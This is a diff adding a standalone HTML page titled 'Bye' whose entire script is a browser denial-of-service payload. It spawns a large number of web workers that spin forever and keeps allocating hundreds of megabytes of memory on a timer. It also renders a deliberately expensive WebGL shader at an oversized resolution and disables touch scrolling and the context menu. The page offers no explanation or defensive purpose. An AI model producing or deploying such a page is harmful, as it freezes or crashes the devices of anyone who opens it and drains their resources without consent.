@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Bye</title>
+  <style>
+    body {
+      margin: 0;
+      height: 100dvh;
+      background: #000;
+      color: #f33;
+      font-family: system-ui, sans-serif;
+      overflow: hidden;
+      display: grid;
+      place-items: center;
+      font-size: 9vw;
+      font-weight: 900;
+      text-shadow: 0 0 40px #f00;
+      user-select: none;
+      -webkit-user-select: none;
+    }
+    canvas {
+      position: fixed;
+      inset: 0;
+      z-index: -1;
+    }
+  </style>
+</head>
+<body>
+
+<div>Bye</div>
+<canvas id="c"></canvas>
+
+<script>
+const workerCode = URL.createObjectURL(new Blob([`
+  'use strict';
+  self.onmessage = () => {
+    let x = performance.now() * Math.PI;
+    while (true) {
+      x = Math.sin(x) * Math.cos(x * 1.1) * Math.tan(x + 1e-6);
+      x = (x * x * x) ** 0.333333 * 1.6180339887;
+      for (let i = 0; i < 40000000; i++) {
+        x += Math.log1p(Math.abs(x) + 1e-300) * 1e-9;
+      }
+    }
+  };
+`], { type: 'application/javascript' }));
+
+const threadCount = (navigator.hardwareConcurrency || 8) * 5;
+for (let i = 0; i < threadCount; i++) {
+  new Worker(workerCode).postMessage('go');
+}
+
+const allocations = [];
+
+function allocBig() {
+  try {
+    const buf = new ArrayBuffer(1 << 28);
+    new Float64Array(buf).fill(performance.now() * Math.random());
+    allocations.push(buf);
+
+    const blob = new Blob([new Uint8Array(1 << 26)], { type: 'application/octet-stream' });
+    allocations.push(URL.createObjectURL(blob));
+  } catch {}
+}
+
+for (let i = 0; i < 120; i++) allocBig();
+setInterval(allocBig, 400);
+
+const canvas = document.getElementById('c');
+const gl = canvas.getContext('webgl2', { antialias: false }) || canvas.getContext('webgl', { antialias: false });
+
+if (gl) {
+  const dpr = Math.min(window.devicePixelRatio || 1, 2.5);
+  
+  function resize() {
+    canvas.width  = innerWidth  * dpr * 2.8;
+    canvas.height = innerHeight * dpr * 2.8;
+    gl.viewport(0, 0, canvas.width, canvas.height);
+  }
+  resize();
+  addEventListener('resize', resize);
+
+  const vs = `#version 300 es
+    in vec2 p;
+    void main() { gl_Position = vec4(p,0,1); }`;
+
+  const fs = `#version 300 es
+    precision highp float;
+    out vec4 frag;
+    uniform float t;
+    uniform vec2 reso;
+
+    float hash(vec2 p) {
+      return fract(sin(dot(p, vec2(12.9898, 78.233))) * 43758.5453);
+    }
+
+    void main() {
+      vec2 uv = gl_FragCoord.xy / reso;
+      float sum = 0.0;
+      float time = t * 0.8;
+
+      for (int i = 0; i < 320; ++i) {
+        float fi = float(i);
+        vec2 off = vec2(sin(fi*0.37 + time), cos(fi*0.41 + time*1.1)) * 0.3;
+        sum += sin(dot(uv + off, vec2(45.0, 38.0)) + fi*0.8 + time) * 1.4;
+        sum += hash(uv * 12.0 + fi + time) * 3.2;
+        sum = fract(sum * 1.414213562 + 0.6180339887);
+      }
+
+      vec3 color = 0.5 + 0.5 * cos(vec3(0.0, 2.1, 4.2) + sum * 1.2 + time * 0.7);
+      frag = vec4(color, 1.0);
+    }`;
+
+  const createShader = (type, src) => {
+    const sh = gl.createShader(type);
+    gl.shaderSource(sh, src);
+    gl.compileShader(sh);
+    return sh;
+  };
+
+  const prog = gl.createProgram();
+  gl.attachShader(prog, createShader(gl.VERTEX_SHADER, vs));
+  gl.attachShader(prog, createShader(gl.FRAGMENT_SHADER, fs));
+  gl.linkProgram(prog);
+  gl.useProgram(prog);
+
+  const buf = gl.createBuffer();
+  gl.bindBuffer(gl.ARRAY_BUFFER, buf);
+  gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1, 1,-1, -1,1, 1,1]), gl.STATIC_DRAW);
+
+  const posLoc = gl.getAttribLocation(prog, 'p');
+  gl.enableVertexAttribArray(posLoc);
+  gl.vertexAttribPointer(posLoc, 2, gl.FLOAT, false, 0, 0);
+
+  const tLoc = gl.getUniformLocation(prog, 't');
+  const rLoc = gl.getUniformLocation(prog, 'reso');
+
+  let start = performance.now();
+
+  function render() {
+    const elapsed = (performance.now() - start) / 1000;
+    gl.uniform1f(tLoc, elapsed);
+    gl.uniform2f(rLoc, canvas.width, canvas.height);
+    gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
+    requestAnimationFrame(render);
+  }
+
+  render();
+}
+
+addEventListener('touchmove', e => e.preventDefault(), { passive: false });
+addEventListener('contextmenu', e => e.preventDefault());
+</script>
+</body>
+</html>
